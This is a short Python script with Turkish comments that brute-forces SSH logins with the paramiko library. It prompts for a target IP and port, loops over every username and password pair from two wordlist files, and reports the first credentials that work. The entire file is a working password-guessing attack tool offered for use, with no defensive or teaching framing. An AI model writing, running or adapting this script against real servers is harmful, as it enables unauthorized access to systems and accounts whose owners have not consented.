import paramiko
import time

# SSH bağlantısı için temel ayarları yapalım
hostname = input("Ip adresi girin: ")  # Hedef SSH sunucu adresi
port = input("Port girin: ")                     # Genellikle SSH portu 22'dir

# Kullanıcı adı ve şifrelerin bulunduğu dosyaların yolları
user_file = 'users.txt'
pass_file = 'passwords.txt'

# Bağlantıyı test eden fonksiyon
def try_ssh_login(username, password):
    try:
        # SSH istemcisini başlatıyoruz
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Sunucu anahtarını kabul etme

        # Bağlantıyı kurmayı deniyoruz
        print(f"Deniyorum: {username} / {password}")
        ssh.connect(hostname, port=port, username=username, password=password, timeout=10)

        # Bağlantı başarılı olursa
        print(f"Başarılı giriş: {username} / {password}")
        ssh.close()  # Bağlantıyı kapatıyoruz
        return True

    except paramiko.AuthenticationException:
        # Kimlik doğrulama hatası
        print(f"Başarısız giriş: {username} / {password}")
        return False
    except Exception as e:
        print(f"Hata: {str(e)}")
        return False

# Kullanıcı adı dosyasını okuma
def read_users(file_path):
    with open(file_path, 'r') as file:
        users = [line.strip() for line in file.readlines()]
    return users

# Şifre dosyasını okuma
def read_passwords(file_path):
    with open(file_path, 'r') as file:
        passwords = [line.strip() for line in file.readlines()]
    return passwords

def main():
    users = read_users(user_file)
    passwords = read_passwords(pass_file)

    # Kullanıcı adları ile şifrelerin tüm kombinasyonlarını deneyelim
    for username in users:
        for password in passwords:
            success = try_ssh_login(username, password)
            if success:
                break  # Eğer bir giriş başarılı olursa, duruyoruz
        if success:
            break  # Başarı durumunda dış döngüyü de durduruyoruz

if __name__ == "__main__":
    main()
